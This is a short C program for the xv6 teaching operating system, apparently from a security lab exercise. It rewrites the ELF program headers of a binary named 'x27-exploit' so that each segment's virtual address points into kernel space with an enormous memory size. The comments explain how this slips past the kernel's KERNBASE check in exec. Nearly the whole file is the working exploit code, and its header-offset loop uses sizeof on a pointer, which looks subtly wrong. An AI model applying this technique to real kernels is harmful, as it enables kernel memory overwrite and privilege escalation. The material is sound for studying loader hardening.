// Set a kernel-space address (0x80103390) in ph.vaddr
// Set a large integer in ph.memsz
//
// This won't be caught at here:
// if(newsz >= KERNBASE)
//   return 0;
// Only at here:
// if(newsz < oldsz)
//   return oldsz;

#include "types.h"
#include "stat.h"
#include "user.h"
#include "fcntl.h"
#include "elf.h"

int
main(int argc, char** argv)
{
  int fd;

  // Open our malicious program first
  if ((fd = open("x27-exploit", O_RDONLY)) < 0) {
    printf(2, "x27-modify: cannot open x27-exploit\n");
    exit();
  }

  struct stat st;
  if(fstat(fd, &st) < 0){
    printf(2, "x27-modify: cannot stat x27-exploit\n");
    close(fd);
    exit();
  }

  char* raw = (char*)malloc(st.size);
  if (read(fd, raw, st.size) != st.size) {
    printf(2, "x27-modify: failed to read x27-exploit\n");
    exit();
  }

  close(fd);

  // Write to ph.vaddr
  // TODO: Read all
  struct elfhdr* elf = (struct elfhdr*)raw;

  struct proghdr* ph;
  for(int i=0, off=elf->phoff; i<elf->phnum; i++, off+=sizeof(ph)){
    ph = raw + off;
    ph->vaddr = 0x80103000;
    ph->memsz = 0x7fefe000;
  }

  // Remove x27-exploit
  if (unlink("x27-exploit") < 0) {
    printf(2, "Failed to unlink x27-exploit\n");
    exit();
  }

  if ((fd = open("x27-exploit", O_CREATE | O_WRONLY)) < 0) {
    printf(2, "x27-modify: cannot open x27-exploit\n");
    exit();
  }

  if (write(fd, raw, st.size) != st.size) {
    printf(2, "Failed to write to x27-exploit\n");
    exit();
  }

  exit();
}
